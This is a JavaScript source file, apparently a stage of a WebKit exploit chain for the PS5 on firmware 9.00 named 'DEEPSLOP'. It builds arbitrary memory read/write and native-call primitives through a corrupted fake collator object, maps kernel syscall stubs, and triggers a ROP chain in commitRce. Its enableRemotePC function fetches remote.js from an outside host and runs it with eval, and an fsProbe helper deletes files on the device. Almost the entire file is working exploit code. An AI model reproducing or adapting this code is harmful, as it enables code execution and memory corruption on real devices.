(function () {
    "use strict";
    if (!window._ds || !window._ds.composition || window._ds.kernel) return;
    var _ds = window._ds;
    var c = _ds.c;
    var s = _ds.s;
    var buf = _ds.buf;
    var mark = _ds.mark;

    var scratchBytes = buf.scratchBytes;
    var scratchWords = buf.scratchWords;
    var collatorOriginal = buf.collatorOriginal;

    function initKernel() {
        var k = s.kernelBase, b = s.arenaBacking, av = s.arenaView, rw = s.rwView;

        var S = (window.deepslopStubs && window.deepslopStubs.addresses) ? window.deepslopStubs.addresses : null;
        var SK = {
            getpid: k + c.P_GETPID_EXP,
            close:  k + c.P_CLOSE_EXP,
            socket: (S && S.socket)     || k+0x1adc1,
            write:  (S && S.write)      || k+0x1aae1,
            read:   (S && S.read)       || k+0x1aa61,
            open:   (S && S.open)       || k+0x1b181,
            pipe:   (S && S.pipe)       || k+0x1b4c1,
            sockpair: (S && S.socketpair) || k+0x1b5a1,
            sso:    (S && S.setsockopt) || k+0x1c1c1,
            gso:    (S && S.getsockopt) || k+0x1c2a1,
            fcntl:  (S && S.fcntl)      || k+0x1b8a1,
            ns:     (S && S.nanosleep)  || k+0x1ba01,
            unlink: (S && S.unlink)     || null,
            thr_self: (S && S.thr_self) || null,
        };

        function pl(off, val) {
            for (var i = 0; i < 6; i++) av[off + i] = Math.floor(val / Math.pow(2, i * 8)) & 0xFF;
        }
        window.call_native = function (addr, rdi, rcx) {
            if (!s.notifyReady) return 0;
            rdi = (rdi || 0); rcx = (rcx || 0);
            pl(0x300 + 0x128, s.naturalTrampolineAddress);
            pl(0x100 + 0xe0, addr);
            pl(0x100 + 0x48, rdi);
            pl(0x100 + 0x60, rcx);
            var hi = Math.floor(s.fakeUCollatorAddress / 0x100000000);
            var lo = s.fakeUCollatorAddress - hi * 0x100000000;
            scratchWords[0] = lo; scratchWords[1] = hi;
            for (var i = 0; i < 8; i++) rw[i] = scratchBytes[i];
            var r = 0;
            try { r = s.compareFn(s.notificationRequest, "b"); } catch (e) {}
            for (var j = 0; j < collatorOriginal.length; j++) rw[j] = collatorOriginal[j];
            pl(0x300 + 0x128, k + 0x1cb93);
            pl(0x100 + 0xe0, k + 0xc7);
            return r;
        };

        var hp = b + 0xE00;
        var ao = function(a) { return Number(BigInt(a) - BigInt(b)); };
        window.malloc = function(sz) { var a = BigInt(hp); hp += (sz + 7) & ~7; return a; };
        window.alloc_string = function(str) {
            var a = window.malloc(str.length + 1), o = ao(a);
            for (var i = 0; i < str.length; i++) av[o + i] = str.charCodeAt(i) & 0xFF;
            av[o + str.length] = 0;
            return a;
        };

        window.write8  = function(a, v) { av[ao(a)] = Number(v) & 0xFF; };
        window.write32 = function(a, v) {
            var o = ao(a), n = Number(v) >>> 0;
            for (var i = 0; i < 4; i++) av[o + i] = (n >> (i * 8)) & 0xFF;
        };
        window.write64 = function(a, v) {
            var V = BigInt(v);
            window.write32(a, Number(V & 0xFFFFFFFFn) >>> 0);
            window.write32(Number(a) + 4, Number((V >> 32n) & 0xFFFFFFFFn) >>> 0);
        };
        window.read8  = function(a) { return BigInt(av[ao(a)]); };
        window.read32 = function(a) {
            var o = ao(a);
            return BigInt((av[o] | av[o+1]<<8 | av[o+2]<<16 | av[o+3]<<24) >>> 0);
        };
        window.read64 = function(a) {
            var o = ao(a); var lo = 0n, hi = 0n;
            for (var i = 0; i < 4; i++) { lo |= BigInt(av[o+i]) << BigInt(i*8); hi |= BigInt(av[o+4+i]) << BigInt(i*8); }
            return (hi << 32n) | lo;
        };

        var SC = {};
        "pipe,2a;unlink,a;socketpair,87;thr_self,1b0;thr_exit,1af;sched_yield,14b;thr_new,1c7;cpuset_getaffinity,1e7;cpuset_setaffinity,1e8;rtprio_thread,1d2;evf_create,21a;evf_delete,21b;evf_set,220;evf_clear,221;thr_suspend_ucontext,278;thr_resume_ucontext,279;aio_multi_delete,296;aio_multi_wait,297;aio_multi_poll,298;aio_multi_cancel,29a;aio_submit_cmd,29d;getpid,14;socket,61;setsockopt,69;getsockopt,6a;fcntl,5c;write,4;read,3;close,6;open,5;nanosleep,1ab;dlsym,24e"
            .split(";").forEach(function(p) { var parts = p.split(","); SC[parts[0]] = BigInt("0x" + parts[1]); });

        var SM = {};
        SM[0x14n] = SK.getpid; SM[0x61n] = SK.socket; SM[0x69n] = SK.sso; SM[0x6an] = SK.gso;
        SM[0x4n]  = SK.write;  SM[0x3n]  = SK.read;   SM[0x6n]  = SK.close; SM[0x5n]  = SK.open;
        SM[0x2an] = SK.pipe;   SM[0x87n] = SK.sockpair; SM[0x1abn] = SK.ns;
        
        if (SK.unlink)  SM[0x0an] = SK.unlink;
        if (SK.thr_self) SM[0x1b0n] = SK.thr_self;

        window.SYSCALL = SC;
        window.syscall = function(id) {
            var a = Array.prototype.slice.call(arguments, 1);
            var i = BigInt(id), st = SM[i];
            if (!st) return -1n;
            var r = call_native(st, a[0] != null ? Number(a[0]) : 0, a[3] != null ? Number(a[3]) : 0);
            return r < 0 ? BigInt(r) | 0xFFFFFFFF00000000n : BigInt(r);
        };
        window.nanosleep = function(ns) {
            var e = Date.now() + Math.max(1, Math.floor(Number(ns) / 1e6));
            while (Date.now() < e) {}
        };
        window.toHex = function(n) { return "0x" + BigInt(n).toString(16); };
        window.LIBKERNEL_HANDLE = -1n;
        window.version_string   = "ROP 9.00 no-JIT";
        window.check_jailbroken = async function() { return false; };
        window.get_error_string = function() { return "(n/a)"; };
        window.ropReady    = true;
        window.syscallReady = true;

        window.syscallClean = function (id, a0, a3) {
            var n = (typeof id === "string") ? SC[id] : BigInt(id);
            if (n == null) return { error: "unknown syscall: " + id };
            var stub = SM[n];
            if (!stub) return { error: "no libkernel stub mapped for " + id };
            var r;
            try {
                r = call_native(Number(stub),
                    a0 != null ? Number(a0) : 0,
                    a3 != null ? Number(a3) : 0);
            } catch (e) {
                return { error: (e && e.name) + ":" + String(e && e.message).slice(0, 60) };
            }
            return { ok: true, ret: r };
        };

        window.syscallDemo = function () {
            var res = { fw: c.FW_LABEL, libkernel: window.toHex(s.kernelBase) };
            try {
                var fds = window.malloc(16);
                res.pipe = window.syscallClean(SC.pipe, Number(fds));
                res.fds = [window.toHex(window.read32(fds)), window.toHex(window.read32(Number(fds) + 4))];
                var f0 = Number(window.read32(fds));
                if (f0 > 0) {
                    res.close1 = window.syscallClean(SC.close, f0);
                    res.close2 = window.syscallClean(SC.close, Number(window.read32(Number(fds) + 4)));
                }
            } catch (e) { res.pipe_err = String(e && e.message); }
            try {
                var fds2 = window.malloc(16);
                res.pipe2 = window.syscallClean(SC.pipe, Number(fds2));
                res.fds2 = [window.toHex(window.read32(fds2)), window.toHex(window.read32(Number(fds2) + 4))];
            } catch (e) { res.pipe2_err = String(e && e.message); }
            res.ropReady = window.ropReady === true;
            return res;
        };

        window.ps5kern = {
            notify: function (text) {
                try { return _ds.sendNotifNatural(String(text)) ? { ok: true } : { error: "notify not armed" }; }
                catch (e) { return { error: String(e && e.message) }; }
            },
            pid: function () { return window.syscallClean(SC.getpid, 0, 0); },
            close: function (fd) { return window.syscallClean(SC.close, Number(fd)); },
            pipe: function () {
                var fds = window.malloc(16);
                var r = window.syscallClean(SC.pipe, Number(fds));
                if (!r || !r.ok) return r || { error: "pipe failed" };
                return { ok: true, fds: [Number(window.read32(fds)), Number(window.read32(Number(fds) + 4))] };
            },
            tid: function () {
                if (!SK.thr_self) return { error: "thr_self stub unavailable" };
                var tid = window.malloc(8);
                var r = window.syscallClean(SC.thr_self, Number(tid));
                if (!r || !r.ok) return r || { error: "thr_self failed" };
                return { ok: true, tid: Number(window.read32(tid)) };
            },
            unlink: function (path) {
                if (!SK.unlink) return { error: "unlink stub unavailable" };
                var p = window.alloc_string(String(path).slice(0, 255));
                return window.syscallClean(SC.unlink, Number(p));
            },
            fsProbe: function (users) {
                var res = { deleted: [], errors: {} };
                var us = Array.isArray(users) && users.length ? users : [0, 1, 2];
                for (var i = 0; i < us.length; i++) {
                    var u = us[i];
                    var files = ["ApplicationCache.db", "ApplicationCache.db-shm", "ApplicationCache.db-wal"];
                    for (var j = 0; j < files.length; j++) {
                        var f = files[j];
                        var p = "/user/home/" + u + "/webkit/shell/appcache/" + f;
                        var r = this.unlink(p);
                        if (r && r.ok) res.deleted.push(p);
                        else res.errors[p] = (r && r.error) ? r.error : "unlink-failed";
                    }
                }
                return res;
            },
            stubReport: function () {
                var scanned = (window.deepslopStubs && window.deepslopStubs.addresses)
                    ? Object.keys(window.deepslopStubs.addresses) : [];
                return {
                    fw: c.FW_LABEL,
                    perFw: { getpid: window.toHex(k + c.P_GETPID_EXP), close: window.toHex(k + c.P_CLOSE_EXP) },
                    stubScan: window.deepslopStubs && window.deepslopStubs.verified ? "verified" : "fallback-9.00",
                    scanned: scanned,
                };
            },
        };

        mark("KERNEL-JS-INIT", "ok");
    }

    function exposeDeepslopGlobals() {
        try {
            window.deepslopInfo = {
                fw: c.FW_LABEL,
                webkitBase: s.webkitBase, kernelBase: s.kernelBase,
                notifyEntryAddress: s.notifyEntryAddress, naturalTrampolineAddress: s.naturalTrampolineAddress,
                arenaBacking: s.arenaBacking, fakeUCollatorAddress: s.fakeUCollatorAddress,
                carrierSlots: c.CARRIER_SLOTS, drainCount: s.drainCount,
                scan: s.deepslopScan,
            };
        } catch (e) { }
        window.deepslopScanOffsets = function () { return s.deepslopScan; };
        window.deepslopMemEstimate = function () {
            var carrier = c.CARRIER_SLOTS * 8;
            var capture = c.CARRIER_SLOTS * 16;
            var drain = s.drainCount * 0x10000;
            var slab = c.SLAB_SIZE;
            return {
                carrierBytes: carrier,
                captureStringBytes: capture,
                drainBytes: drain,
                slabBytes: slab,
                arenaBytes: c.ARENA_BYTES,
                totalBytes: carrier + capture + drain + slab + c.ARENA_BYTES,
                carrierSlots: c.CARRIER_SLOTS, drainCount: s.drainCount,
            };
        };
    }

    function runProbeReport() {
        try { initKernel(); } catch (e) { }
        mark("PROBE-REPORT", "webkit=" + _ds.hex(s.webkitBase)
            + "-kernel=" + _ds.hex(s.kernelBase)
            + "-notify=" + _ds.hex(s.notifyEntryAddress)
            + "-trampoline=" + _ds.hex(s.naturalTrampolineAddress));
        if (s.getterCarrier !== null) {
            s.getterCarrier = null;
            s.preparedSymbolObject = null;
            s.fillerGraph = null;
            s.outerGraph = null;
            s.leakedScope = null;
            s.capturedString = null;
            s.capturedWords = null;
            s.keepAlive = null;
            s.predecessorWords = null;
            s.deepslopScan = null;
        }
        exposeDeepslopGlobals();
        exposePayloadGlobals();
        s.stopped = true;
        _ds.catState("ok");
        _ds.setCaption("PoC PS5 FW " + c.FW_LABEL + " - PROBE COMPLETE");
        _ds.showStatus("PROBE COMPLETE - offsets verified, no commit", "ok");
        try {
            if (typeof window.addExploitStatus === "function")
                window.addExploitStatus("PROBE COMPLETE - offsets verified, no commit", "ok");
        } catch (e) { }
    }

    function exposePayloadGlobals() {
        if (typeof window === "undefined") return;
        window.send_notification = function (text) {
            _ds.sendNotifNatural(String(text));
        };
        window.log = window.log || (async function (msg) {
            mark("LOG", String(msg));
        });
        window.kernelBase               = s.kernelBase;
        window.arenaBacking             = s.arenaBacking;
        window.arenaView                = s.arenaView;
        window.rwView                   = s.rwView;
        window.compareFn                = s.compareFn;
        window.notificationRequest      = s.notificationRequest;
        window.naturalTrampolineAddress = s.naturalTrampolineAddress;
        window.fakeUCollatorAddress     = s.fakeUCollatorAddress;
        window.scratchWords             = scratchWords;
        window.scratchBytes             = scratchBytes;
        window.collatorOriginal         = collatorOriginal;
        window.notifyReady              = true;
        window.commitStarted            = false;
        window.putLow48                 = _ds.putLow48;
        window.mark                     = mark;
        window.RCE_PC_IP                = c.RCE_PC_IP;
        window.RCE_PORT                 = c.RCE_PORT;
        if (!c.PROBE_MODE) window.commitRce = commitRce;
        exposeDeepslopGlobals();
    }

    async function loadAndCommitRce() {
        if (s.getterCarrier !== null) {
            mark("CARRIER-FREE", "releasing refs");
            s.getterCarrier       = null;
            s.preparedSymbolObject = null;
            s.fillerGraph         = null;
            s.outerGraph          = null;
            s.leakedScope         = null;
        }
        await new Promise(function(r) { setTimeout(r, 800); });

        try {
            initKernel();
        } catch (e) {
            mark("KERNEL-JS-INIT-ERR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
        }

        try {
            _ds.sendNotifNatural("RCE READY - DEEPSLOP on-device");
        } catch (e) {
            mark("NOTIFY-SEND-ERR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
        }

        exposePayloadGlobals();

        window.remoteJsLoaded = false;
        window.enableRemotePC = async function () {
            var PC_IP = c.RCE_PC_IP.join(".");
            var baseUrl = "http://" + PC_IP + ":8080";
            if (window.remoteJsLoaded) {
                mark("REMOTE-JS-SKIP", "already-loaded");
                return { ok: false, error: "remote.js already loaded" };
            }
            var remoteUrl = baseUrl + "/remote.js?v=" + c.REVISION;
            mark("REMOTE-JS-FETCH", "url=" + remoteUrl);
            try {
                var resp = await fetch(remoteUrl);
                if (resp.ok) {
                    var code = await resp.text();
                    mark("REMOTE-JS-LOADED", "size=" + code.length);
                    try {
                        await eval(code);
                        window.remoteJsLoaded = true;
                        mark("REMOTE-JS-DONE", "eval-ok");
                        return { ok: true };
                    } catch (e) {
                        mark("REMOTE-JS-ERROR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
                        return { ok: false, error: e && (e.name + ":" + e.message) };
                    }
                } else {
                    mark("REMOTE-JS-HTTP-ERR", "status=" + resp.status);
                    return { ok: false, error: "HTTP " + resp.status };
                }
            } catch (e) {
                mark("REMOTE-JS-FETCH-FAIL", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
                return { ok: false, error: e && (e.name + ":" + String(e && e.message).slice(0, 60)) };
            }
        };
    }

    function commitRce() {
        if (!s.notifyReady || !s.carrierArmedForCommit || !s.commitBlockConfirmed
            || s.commitStarted) {
            mark("RCE-ABORT", "state-changed-before-commit");
            _ds.failed();
            return;
        }

        for (var before = 0; before < collatorOriginal.length; ++before) {
            if (s.rwView[before] !== collatorOriginal[before]) {
                mark("RCE-ABORT", "collator-bytes-changed");
                _ds.failed();
                return;
            }
        }
        if (s.rwView[0x1b] !== 0) {
            mark("RCE-ABORT", "ascii-tristate-no-longer-false");
            _ds.failed();
            return;
        }
        if (!s.notificationRequestOK
            || s.notificationRequest.length !== c.NOTIFICATION_REQUEST_SIZE) {
            mark("RCE-ABORT", "request-changed");
            _ds.failed();
            return;
        }

        s.commitStarted = true;
        var fakeHigh = Math.floor(s.fakeUCollatorAddress / 0x100000000);
        scratchWords[0] = s.fakeUCollatorAddress - fakeHigh * 0x100000000;
        scratchWords[1] = fakeHigh;
        var callError = null;
        for (var commitByte = 0; commitByte < 8; ++commitByte)
            s.rwView[commitByte] = scratchBytes[commitByte];

        mark("RCE-COMMIT", "triggering-rop-chain");
        try {
            s.compareFn(s.notificationRequest, "b");
        } catch (error) {
            callError = error;
        }

        for (var restoreByte = 0; restoreByte < collatorOriginal.length; ++restoreByte)
            s.rwView[restoreByte] = collatorOriginal[restoreByte];

        s.fakeHost.q2 = null;
        s.rwView = null;
        s.rwMirror = null;
        buf.rwBuffer = null; // using buf reference

        if (callError) {
            mark("RCE-CRASH", (callError && callError.name)
                + ":" + String(callError && callError.message).slice(0, 80));
        } else {
            mark("RCE-UNEXPECTED-RETURN", "chain-returned");
        }
        _ds.failed();
        setTimeout(function() { mark("SURVIVED-RCE-T1000"); }, 1000);
    }

    _ds.initKernel = initKernel;
    _ds.exposeDeepslopGlobals = exposeDeepslopGlobals;
    _ds.exposePayloadGlobals = exposePayloadGlobals;
    _ds.runProbeReport = runProbeReport;
    _ds.loadAndCommitRce = loadAndCommitRce;
    _ds.commitRce = commitRce;
    _ds.kernel = true;
})();
